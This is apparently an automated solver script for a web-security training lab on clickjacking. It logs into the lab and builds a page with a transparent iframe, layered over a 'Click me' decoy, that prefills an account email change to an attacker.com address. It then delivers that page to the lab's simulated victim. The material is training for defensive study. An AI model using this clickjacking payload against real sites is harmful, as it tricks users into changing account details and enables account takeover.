const { getExploitServerUrl, labLogin, runLab } = require('./_common.cjs');

const TITLE = 'Clickjacking with form input data prefilled from a URL parameter';
const PATH = '/web-security/clickjacking/lab-basic-clickjacking-with-form-input-data-prefilled-from-a-url-parameter';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    const exploitUrl = await getExploitServerUrl(page, labUrl);
    const body = `<html>
<head>
<style>
iframe {
  position: relative;
  width: 500px;
  height: 700px;
  opacity: 0.0001;
  z-index: 2;
}
div {
  position: absolute;
  top: 460px;
  left: 80px;
  z-index: 1;
}
</style>
</head>
<body>
<div>Click me</div>
<iframe src="${labUrl}/my-account?email=gwyo@attacker.com"></iframe>
    </body>
</html>`;
    await page.goto(exploitUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.evaluate(async (payload) => {
      const send = async (formAction) => {
        const params = new URLSearchParams({
          formAction,
          urlIsHttps: 'on',
          responseFile: '/exploit',
          responseHead: 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
          responseBody: payload,
        });
        await fetch(location.pathname, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: params.toString(),
        });
      };
      await send('STORE');
      await send('DELIVER_TO_VICTIM');
    }, body);
    await page.waitForTimeout(5000);
  },
});
